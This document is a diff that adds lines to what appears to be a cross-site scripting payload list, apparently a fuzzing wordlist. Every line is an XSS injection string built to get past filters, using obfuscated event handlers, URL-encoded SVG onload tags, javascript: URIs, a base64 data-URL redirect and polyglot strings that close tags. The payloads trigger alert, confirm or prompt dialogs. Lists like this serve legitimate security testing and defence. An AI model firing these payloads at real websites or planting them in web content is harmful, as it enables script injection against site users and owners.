@@ -1,1 +1,12 @@
 <inpuT autofocus oNFocus​="setTimeout(function() { /*\`*/top['al'+'\u0065'+'rt']([!+[]+!+[]]+[![]+[]][+[]])/*\`*/ }, 5000);"></inpuT%3E&lT;/stYle&lT;/titLe&lT;/teXtarEa&lT;/scRipt&gT;
+"%3cSvg%20Only%3d1%20OnLoad%3dconfirm(1)%3e"
+%3Csvg%2Fonload%3Dalert%28%22XSS%22%29%20%3E
+abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
+<a+HREF="%26%237 javascrip%26%239t: alert%261par;document .domain) *> 
+/>&_lt;_script>alert(1)&_lt;/scr_ipt>/>
+<a href=[ ]"  onmouseover=prompt(1)//">XYZ</a>
+<script /*/>/*/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/*/</script /*/
+<blink/  onmouseover=prompt(1)>OnMouseOver 
+<svg><foreignObject width="100%" height="100%">     <body> <iframe src='javascript:confirm(10)'></iframe>     </body>   </foreignObject> </svg>
+<script>var a=document.createElement("a");a.href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==";a.click();</script>
+jaVasCript:/--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[/[]/+alert(1)//'>"'alert(1)
